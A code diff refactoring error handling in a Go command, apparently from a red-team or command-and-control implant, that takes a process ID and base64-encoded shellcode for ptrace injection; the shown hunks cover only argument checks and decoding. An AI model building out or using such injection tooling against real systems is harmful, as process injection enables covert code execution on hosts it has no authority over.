@@ -32,20 +32,12 @@ type ptraceInjectArgs struct {
 
 func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    "Error: parameters required. Actions: check, inject",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: parameters required. Actions: check, inject")
 	}
 
 	var args ptraceInjectArgs
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	action := strings.ToLower(args.Action)
@@ -59,11 +51,7 @@ func (c *PtraceInjectCommand) Execute(task structs.Task) structs.CommandResult {
 	case "inject":
 		return ptraceInject(args)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: check, inject", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s\nAvailable: check, inject", args.Action)
 	}
 }
 
@@ -160,36 +148,20 @@ func ptraceCheck() structs.CommandResult {
 
 func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	if args.PID <= 0 {
-		return structs.CommandResult{
-			Output:    "Error: valid pid required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: valid pid required")
 	}
 
 	if args.ShellcodeB64 == "" {
-		return structs.CommandResult{
-			Output:    "Error: shellcode_b64 required (base64-encoded shellcode)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: shellcode_b64 required (base64-encoded shellcode)")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return structs.CommandResult{
-			Output:    "Error: shellcode is empty",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: shellcode is empty")
 	}
 
 	restore := true
